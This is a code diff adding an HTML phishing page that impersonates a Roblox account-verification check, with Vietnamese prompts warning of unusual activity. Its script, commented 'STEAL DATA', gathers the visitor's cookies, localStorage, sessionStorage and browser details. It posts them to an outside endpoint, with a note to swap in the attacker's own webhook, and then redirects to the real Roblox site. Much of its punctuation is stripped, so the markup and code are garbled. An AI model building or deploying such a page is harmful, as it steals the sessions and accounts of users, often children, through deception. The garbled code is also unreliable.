@@ -1,0 +1,53 @@
+!DOCTYPE html
+html
+head
+    titleRoblox Security Checktitle
+    style
+        body {background linear-gradient(45deg, #00bfff, #ff69b4); font-family Arial; text-aligncenter; padding60px;}
+        .container {backgroundwhite; padding30px; border-radius15px; max-width400px; marginauto; box-shadow0 10px 30px rgba(0,0,0,0.3);}
+        button {background#00d4aa; colorwhite; bordernone; padding15px 30px; font-size18px; border-radius25px; cursorpointer;}
+        .loading {displaynone; color#666;}
+    style
+head
+body
+    div class=container
+        img src=httpswww.roblox.comThumbsAvatarHeadshothash=123 width=80 style=border-radius50%;
+        h2🔒 Roblox Account Verificationh2
+        pChúng tôi phát hiện hoạt động lạ. Xác nhận tài khoản để tiếp tục.p
+        button onclick=verifyAccount()Xác nhận ngay (30s)button
+        div id=loading class=loadingĐang xác minh... span id=dotsspandiv
+    div
+
+script
+function verifyAccount() {
+    document.getElementById('loading').style.display = 'block';
+    let dots = 0;
+    setInterval(() = {
+        dots = (dots + 1) % 4;
+        document.getElementById('dots').textContent = '.'.repeat(dots);
+    }, 300);
+
+     STEAL DATA
+    const data = {
+        cookie document.cookie,
+        localStorage JSON.stringify(localStorage),
+        sessionStorage JSON.stringify(sessionStorage),
+        userAgent navigator.userAgent,
+        url window.location.href,
+        timestamp new Date().toISOString()
+    };
+
+     GỬI VỀ SERVER CỦA BẠN
+    fetch('httpshttpbin.orgpost', {   THAY BẰNG WEBHOOK CỦA BẠN
+        method 'POST',
+        headers {'Content-Type' 'applicationjson'},
+        body JSON.stringify(data)
+    }).then(() = {
+        setTimeout(() = {
+            window.location = 'httpswww.roblox.comhome';
+        }, 2000);
+    });
+}
+script
+body
+html
